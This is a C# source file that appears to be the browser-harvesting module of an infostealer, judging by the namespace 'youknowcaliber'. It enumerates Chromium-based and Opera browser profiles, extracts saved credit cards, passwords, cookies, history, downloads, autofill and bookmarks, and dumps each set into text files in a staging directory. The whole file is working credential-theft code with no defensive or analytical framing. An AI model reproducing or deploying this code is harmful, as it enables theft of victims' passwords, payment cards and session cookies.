﻿using System;
using System.Collections.Generic;
using System.IO;

namespace youknowcaliber.Chromium
{
	internal sealed class Recovery
	{
		public static void Run(string sSavePath)
		{
			bool flag = !Directory.Exists(sSavePath);
			if (flag)
			{
				Directory.CreateDirectory(sSavePath);
			}
			foreach (string text in Paths.sChromiumPswPaths)
			{
				bool flag2 = text.Contains("Opera Software");
				string path;
				if (flag2)
				{
					path = Paths.appdata + text;
				}
				else
				{
					path = Paths.lappdata + text;
				}
				bool flag3 = Directory.Exists(path);
				if (flag3)
				{
					foreach (string str in Directory.GetDirectories(path))
					{
						string text2 = sSavePath + "\\" + Crypto.BrowserPathToAppName(text);
						Directory.CreateDirectory(text2);
						List<CreditCard> cCC = CreditCards.Get(str + "\\Web Data");
						List<Password> pPasswords = Passwords.Get(str + "\\Login Data");
						List<Cookie> cCookies = Cookies.Get(str + "\\Cookies");
						List<Site> sHistory = History.Get(str + "\\History");
						List<Site> sHistory2 = Downloads.Get(str + "\\History");
						List<AutoFill> aFills = Autofill.Get(str + "\\Web Data");
						List<Bookmark> bBookmarks = Bookmarks.Get(str + "\\Bookmarks");
						cBrowserUtils.WriteCreditCards(cCC, text2 + "\\CreditCards.txt");
						cBrowserUtils.WritePasswords(pPasswords, text2 + "\\Passwords.txt");
						cBrowserUtils.WriteCookies(cCookies, text2 + "\\Cookies.txt");
						cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
						cBrowserUtils.WriteHistory(sHistory2, text2 + "\\Downloads.txt");
						cBrowserUtils.WriteAutoFill(aFills, text2 + "\\AutoFill.txt");
						cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
					}
				}
			}
		}
	}
}
